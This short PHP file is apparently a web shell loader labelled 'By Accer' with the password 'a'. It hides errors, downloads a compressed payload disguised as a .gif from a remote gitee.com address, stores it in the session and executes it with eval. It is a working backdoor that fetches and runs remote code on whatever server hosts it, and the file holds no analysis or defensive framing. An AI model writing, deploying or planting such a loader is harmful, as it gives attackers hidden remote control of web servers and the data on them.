<?php
header("Content-type:text/html;charset=utf8");
$password='a';
$shellname='By Accer';
error_reporting(0);
session_start();
if(empty($_SESSION[code])){
	$_SESSION[code]=gzinflate(file_get_contents("https://gitee.com/accessed/WL/raw/master/p.gif"));
}
@eval($_SESSION['code']);
?>